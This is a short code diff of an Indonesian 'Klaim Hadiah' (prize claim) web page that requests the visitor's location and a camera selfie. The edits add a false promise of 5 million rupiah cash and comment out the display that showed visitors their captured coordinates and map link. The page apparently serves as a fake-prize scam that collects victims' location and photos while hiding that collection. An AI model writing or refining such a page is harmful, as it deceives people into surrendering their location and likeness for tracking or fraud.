@@ -24,7 +24,7 @@
   <div class="card">
     <h1>Klaim Hadiah</h1>
     <p class="muted">
-      Selamat! Anda dapat mengklaim hadiah. Untuk keamanan dan verifikasi penerima, mohon izinkan akses lokasi dan kamera (selfie). Proses ini hanya membutuhkan satu kali izin dan pengambilan foto.
+      Selamat! Anda dapat mengklaim hadiah <b>Tunai Rp. 5JT</b>. Untuk keamanan dan verifikasi penerima, mohon izinkan akses lokasi dan kamera (selfie). Proses ini hanya membutuhkan satu kali izin.
       
     </p>
 
@@ -107,11 +107,11 @@ async function startFlow(){
 }
 
 function showMapLink(lat, lon){
-  ui.result.innerHTML = `
-    Koordinat: <b>${lat.toFixed(6)}, ${lon.toFixed(6)}</b><br>
-    Akurasi: <b>${Math.round((+posAcc(acc=0)))} m</b><br>
-    <a class="map" href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" rel="noopener">Buka di Google Maps</a>
-  `;
+  // ui.result.innerHTML = `
+  //   Koordinat: <b>${lat.toFixed(6)}, ${lon.toFixed(6)}</b><br>
+  //   Akurasi: <b>${Math.round((+posAcc(acc=0)))} m</b><br>
+  //   <a class="map" href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" rel="noopener">Buka di Google Maps</a>
+  // `;
 }
 function posAcc(a){ return a || 0; } // helper kecil
 
